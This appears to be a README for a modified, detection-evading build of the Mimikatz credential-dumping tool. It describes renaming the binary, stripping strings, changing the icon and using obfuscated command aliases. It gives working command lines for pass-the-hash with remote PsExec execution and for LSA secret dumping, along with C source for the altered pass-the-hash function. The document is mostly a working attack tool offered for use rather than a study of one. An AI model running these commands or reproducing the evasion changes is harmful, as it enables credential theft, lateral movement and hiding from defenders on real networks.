# Updates to the Mimikatz bin

The original mimikatz version used can be found at: https://github.com/gentilkiwi/mimikatz

Modifications:
* Mimikatz was renamed to DvKGMmGn.exe
* Renamed all common files/functions.
* Removed descriptive strings, and other strings as seen.
* Stripped out unused functionality
* Changed icon

## Command Changes

* `privilege::debug` is now  `pr::d`
* `sekurlsa` - `slsa`
* `lsadump` - `lsdu`
* `logonpasswords` - `lop`
* `privilege` - `pr`
* `token` - `mrio`
* `elevate` - `1up`
* pass the hash is now called with `slsa::htp`
* logonpasswords is called with `slsa::lop`
* lsadump::lsa is now `lsdu::go`  (`/inject` is now `/ynot`) (`/patch` is now `/pooch`)
* `exit` was changed to `quit`

## Custom PSExec Commands
* Adding `/remotepc:<pcname>` to pass-the-hash is the first argument to initiate psexec and is always required. (you 
do not need to add backslashes `\\`)
* The path to psexec is always required: `/pexe:C:\Path\to\PSExec.exe`
* If you want to execute psexec's `-c` command then you use: `/prun:c:\path\to\executable.exe`
* Output console text to a file: `/out:C:\outfile.txt` (adds `> c:\outfile.txt` to the psexec command)
* Use `/sys:1` to add psexec `-s` (run as system).

Full mimikatz command executing psexec -c:
```
.\mimikatz.exe "slsa::htp /user:sbusby /ntlm:xxx /domain:. /remotepc:1.2.3.4 /pexe:C:\psexec.exe /sys:1 /prun:C:\Windows\System32\calc.exe /out:C:\outfile.txt" "quit" 
```

Resulting command created/executed by mimikatz:
```
C:\psexec.exe \\1.2.3.4 -accepteula -s -c C:\Windows\System32\calc.exe > C:\outfile.txt
```

##### Executing example commands:
Executing an LSA Dump:
`mimikatz.exe "privilege::d lsdu::go /ynot"`


## Adjustments made to mimikatz PTH function

The pass-the-hash function was modified to accept additional arguments since
mimikatz PTH did not allow for arguments as a part of the PTH command.

```
NTSTATUS kuhl_m_sekurlsa_pth(int argc, wchar_t * argv[])
{
	BYTE ntlm[LM_NTLM_HASH_LENGTH], aes128key[AES_128_KEY_LENGTH], aes256key[AES_256_KEY_LENGTH];
	TOKEN_STATISTICS tokenStats;
	SEKURLSA_PTH_DATA data = {&tokenStats.AuthenticationId, NULL, NULL, NULL, FALSE};
	PWCHAR szUser, szDomain, szRun, szNTLM, szAes128, szAes256, szLuid, szRemotePC, szpsSys, szpsPath, szpsRunPath, szOutPath, szpsCopyRunPath = NULL;
	DWORD dwNeededSize;
	HANDLE hToken, hNewToken;
	PROCESS_INFORMATION processInfos;
	BOOL isImpersonate;
	WCHAR result[1024];   // array to hold the result.
	PCWCHAR dblBack = L"\\\\";
	PCWCHAR space = L" ";

	if(kull_m_string_args_byName(argc, argv, L"luid", &szLuid, NULL))
	{
		tokenStats.AuthenticationId.HighPart = 0; // because I never saw it != 0
		tokenStats.AuthenticationId.LowPart = wcstoul(szLuid, NULL, 0);
	}
	else
	{
		if(kull_m_string_args_byName(argc, argv, L"user", &szUser, NULL))
		{
			if(kull_m_string_args_byName(argc, argv, L"domain", &szDomain, NULL))
			{
				isImpersonate = kull_m_string_args_byName(argc, argv, L"impersonate", NULL, NULL);
#pragma warning(push)
#pragma warning(disable:4996)

				if (kull_m_string_args_byName(argc, argv, L"pexe", &szpsPath, NULL)) //psexec path
				{
					if (kull_m_string_args_byName(argc, argv, L"remotepc", &szRemotePC, NULL)) //remote pc path
					{
						if (kull_m_string_args_byName(argc, argv, L"prun", &szpsRunPath, NULL)) //file to execute
						{
							PCWCHAR cmd2 = L" -accepteula -c ";

							wcscpy(result, szpsPath); // copy string one into the result.
							wcscat(result, space);  // space
							wcscat(result, dblBack);  // append string two to the result.
							wcscat(result, szRemotePC);
							if (kull_m_string_args_byName(argc, argv, L"sys", &szpsSys, NULL)) //-s (system)
							{
								wcscat(result, L" -s ");
							}
							wcscat(result, cmd2);
							wcscat(result, szpsRunPath);

							if (kull_m_string_args_byName(argc, argv, L"out", &szOutPath, NULL)) //output to file
							{
								PCWCHAR fmt = L" > ";
								wcscat(result, fmt);
								wcscat(result, szOutPath);
							}
							kull_m_string_args_byName(argc, argv, L"zz", &szRun, isImpersonate ? _wpgmptr : result);
						}
					}
				}
				else
				{
					kull_m_string_args_byName(argc, argv, L"run", &szRun, isImpersonate ? _wpgmptr : L"cmd.exe");
				}

```